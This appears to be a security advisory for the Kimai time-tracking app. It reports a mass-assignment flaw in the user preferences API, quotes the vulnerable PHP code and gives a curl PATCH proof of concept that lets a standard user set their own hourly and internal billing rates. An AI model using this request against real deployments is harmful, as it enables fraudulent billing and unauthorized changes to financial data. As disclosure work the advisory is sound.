summary: "Kimai's User Preferences API allows standard users to modify restricted attributes:\
  \ hourly_rate, internal_rate\n### Summary\nA Mass Assignment / Broken Object Property Level\
  \ Authorization (BOPA) vulnerability in the User Preferences API allows any authenticated\
  \ user (even those with the lowest privileges) to arbitrarily modify restricted financial\
  \ attributes on their profile, specifically their `hourly_rate` and `internal_rate`.\n\n###\
  \ Details\nKimai restrictively protects the `hourly_rate` and `internal_rate` parameters during\
  \ standard GUI flow. Users lacking the `hourly-rate` role permissions cannot see or edit these\
  \ fields via the standard Web Form (`UserApiEditForm` / `UserEditType`). \n\nThe vulnerability\
  \ exists in the dedicated preferences API endpoint: `src/API/UserController.php::updateUserPreference`.\n\
  \nWhen a `PATCH` request is sent to `/api/users/{id}/preferences`, the endpoint iterates through\
  \ the submitted JSON array and blindly applies the new values:\n```php\nforeach ($request->request->all()\
  \ as $preference) {\n    // ... validation omitted ...\n    if (null === ($meta = $profile->getPreference($name)))\
  \ {\n        throw $this->createNotFoundException(\\sprintf('Unknown custom-field \"%s\" requested',\
  \ $name));\n    }\n\n    $meta->setValue($value); // <-- VULNERABILITY\n}\n```\n\nThe underlying\
  \ Role-Based Access Control logic (`UserPreferenceSubscriber::getDefaultPreferences`) accurately\
  \ identifies that standard users lack the `hourly-rate` role, and flags the dynamically generated\
  \ preference object as disabled (`$preference->setEnabled(false)`). \n\nHowever, the `updateUserPreference`\
  \ API endpoint entirely ignores this `isEnabled()` flag and forcefully saves the mutated object\
  \ to the database natively via Doctrine ORM. This allows unauthorized accounts to manipulate\
  \ the business-logic variables calculating their own financial earnings.\n\n### PoC\n1. Log\
  \ into Kimai as an unprivileged, standard employee account (a user with absolutely no `roles`\
  \ array privileges). \n2. Capture the `cookie` or Session cookies. (In this example, the user's\
  \ ID is `2`).\n3. Send the following cURL request (or intercept via Burp Suite) targeting\
  \ your own user ID:\n\n```bash\ncurl -i -X PATCH \"http://localhost:8001/api/users/2/preferences\"\
  \ \\\n  -H \"Content-Type: application/json\" \\\n  -H \"cookie: <YOUR_STANDARD_USER_TOKEN>\"\
  \ \\\n  -d '[\n  {\n    \"name\": \"hourly_rate\",\n    \"value\": \"1337\"\n  },\n  {\n \
  \   \"name\": \"internal_rate\",\n    \"value\": \"1337\"\n  }\n]'\n```\n\n4. The server responds\
  \ with `HTTP/1.1 200 OK`. (Note: The `hourly_rate` will intentionally NOT appear in the JSON\
  \ echo due to `User::getVisiblePreferences` sanitizing output based on the same disabled flag).\n\
  5. If an Administrator organically views User 2's profile within Kimai, or if the user logs\
  \ any new timesheets, the active and billed `hourly_rate` applied to their account will be\
  \ confirmed as `1337`.\n<img width=\"1542\" height=\"1039\" alt=\"user_account\" src=\"https://github.com/user-attachments/assets/fff5e2da-d598-408d-8a01-784499ade844\"\
  \ />\n<img width=\"1539\" height=\"1037\" alt=\"admin_account\" src=\"https://github.com/user-attachments/assets/86a6e8c3-a97f-4be3-9f9f-2e23fad1d8a0\"\
  \ />\n\n### Impact\nThis is a Privilege Escalation and Business Logic Flaw impacting the core\
  \ financial calculations of the application. An attacker with a standard user account can\
  \ manipulate their own billing rate multipliers unbeknownst to administrators, resulting in\
  \ fraudulent invoices, distorted timesheet exports, and unauthorized financial tampering."
